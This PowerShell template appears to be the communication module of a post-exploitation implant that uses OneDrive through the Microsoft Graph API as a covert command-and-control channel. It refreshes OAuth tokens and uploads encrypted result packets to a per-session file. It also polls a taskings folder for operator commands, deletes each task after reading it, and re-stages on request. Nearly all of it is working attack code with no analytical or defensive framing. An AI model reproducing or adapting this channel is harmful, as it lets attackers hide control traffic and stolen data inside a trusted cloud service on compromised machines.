$Script:TokenObject = @{token="{{ token }}";refresh="{{ refresh_token }}";expires=(Get-Date).addSeconds(3480)};
$script:GetWebClient = {
    $wc = New-Object System.Net.WebClient;
    $wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
    $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
    if($Script:Proxy) {
        $wc.Proxy = $Script:Proxy;
    }
    if((Get-Date) -gt $Script:TokenObject.expires) {
        $data = New-Object System.Collections.Specialized.NameValueCollection;
        $data.add("client_id", "{{ client_id }}");
        $data.add("client_secret", "{{ client_secret }}");
        $data.add("grant_type", "refresh_token");
        $data.add("scope", "files.readwrite offline_access");
        $data.add("refresh_token", $Script:TokenObject.refresh);
        $data.add("redirect_uri", "{{ redirect_uri }}");
        $bytes = $wc.UploadValues("https://login.microsoftonline.com/common/oauth2/v2.0/token", "POST", $data);
        $response = [system.text.encoding]::ascii.getstring($bytes);
        $Script:TokenObject.token = [regex]::match($response, '"access_token":"(.+?)"').groups[1].value;
        $Script:TokenObject.refresh = [regex]::match($response, '"refresh_token":"(.+?)"').groups[1].value;
        $expires_in = [int][regex]::match($response, '"expires_in":([0-9]+)').groups[1].value;
        $Script:TokenObject.expires = (get-date).addSeconds($expires_in - 15);
    }
    $wc.headers.add("User-Agent", $script:UserAgent);
    $wc.headers.add("Authorization", "Bearer $($Script:TokenObject.token)");
    $Script:Headers.GetEnumerator() | ForEach-Object {$wc.Headers.Add($_.Name, $_.Value)};
    $wc;
};

$script:SendMessage = {
        param($packets)

        if($packets) {
            $encBytes = encrypt-bytes $packets;
            $RoutingPacket = New-RoutingPacket -encData $encBytes -Meta 5;
        } else {
            $RoutingPacket = "";
        }

        $wc = (& $GetWebClient);
        $resultsFolder = "{{ base_folder }}/{{ results_folder }}";

        try {
            try {
                $data = $null;
                $data = $wc.DownloadData("https://graph.microsoft.com/v1.0/drive/root:/$resultsFolder/$($script:SessionID).txt:/content");
            } catch {}

            if($data -and $data.length -ne 0) {
                $routingPacket = $data + $routingPacket;
            }

            $wc = (& $GetWebClient);
            $null = $wc.UploadData("https://graph.microsoft.com/v1.0/drive/root:/$resultsFolder/$($script:SessionID).txt:/content", "PUT", $RoutingPacket);
            $script:missedChecking = 0;
            $script:lastseen = get-date;
        }
        catch {
            if($_ -match "Unable to connect") {
                $script:missedCheckins += 1;
            }
        }
    }

$script:lastseen = Get-Date
$script:GetTask = {
    try
    {
        $wc = (& $GetWebClient);

        $TaskingsFolder = "{{ base_folder }}/{{ taskings_folder }}";

        #If we haven't sent a message recently...
        if ($script:lastseen.addseconds($script:AgentDelay * 2) -lt (get-date))
        {
            (& $SendMessage -packets "")
        }
        $script:MissedCheckins = 0;

        $data = $wc.DownloadData("https://graph.microsoft.com/v1.0/drive/root:/$TaskingsFolder/$( $script:SessionID ).txt:/content");

        if ($data -and ($data.length -ne 0))
        {
            {
                $wc = (& $GetWebClient)
                $null = $wc.UploadString("https://graph.microsoft.com/v1.0/drive/root:/$TaskingsFolder/$( $script:SessionID ).txt", "DELETE", "");
                if ([system.text.encoding]::utf8.getString($data) -eq "RESTAGE")
                {
                    Start-Negotiate -T $script:TokenObject.token -SK $SK -PI $PI -UA $UA;
                }
                $Data;
            }
        }
    }
    catch {
        if ($_ -match "Unable to connect")
        {
            $script:MissedCheckins += 1;
        }
    }
}

